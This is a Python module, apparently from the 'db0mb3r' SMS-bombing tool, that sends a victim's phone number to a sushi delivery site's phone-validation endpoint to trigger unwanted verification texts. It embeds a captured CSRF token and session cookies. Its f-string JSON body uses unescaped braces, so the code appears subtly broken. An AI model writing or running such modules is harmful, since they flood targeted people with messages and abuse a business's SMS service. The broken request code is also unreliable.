from db0mb3r.services.service import Service

class SushiWok(Service):
    async def run(self):
        await self.post(
            "https://sushiwok.ru/user/phone/validate",
            data=f'{"phone":"{self.formatted_phone}","numbers":4}',
            headers={
                "authority": "sushiwok.ru",
                "accept": "application/json, text/plain, */*",
                "x-csrf-token": "tz70vMoL-0VQInx5uaTRC14legs_CX8DC9os",
                "x-requested-with": "XMLHttpRequest",
                "user-agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.183 Safari/537.36 OPR/72.0.3815.207",
                "content-type": "application/json;charset=UTF-8",
                "origin": "https://sushiwok.ru",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://sushiwok.ru/spb/profile/",
                "accept-language": "ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7",
                "cookie": "_csrf=lH4Ryi1VBKZsZ2r7UkeCEfrK; connect.sid=s%3AGr79X3B4iQFod3Sein1U-GlPnQvTllce.LisIeAqUdn0NtG8UMpxKWyFxWOcXMka9wD%2BMzYLBSb0; _gid=GA1.2.2060884779.1615215100; _ym_uid=1615215101536389399; _ym_d=1615215101; lgvid=604639f846e0fb0001e64fc3; lgkey=3fceed4268e01da86922939315def11c; _ym_visorc=w; _ym_isad=1; _fbp=fb.1.1615215103948.1720604809; _gat_gtag_UA_88670217_1=1; _gat_ITRZ=1; _gat_SPB=1; _gat_GA=1; _ga=GA1.1.895858968.1615215100; _ga_TE53H5X77H=GS1.1.1615215102.1.1.1615215127.0",
            },
        )
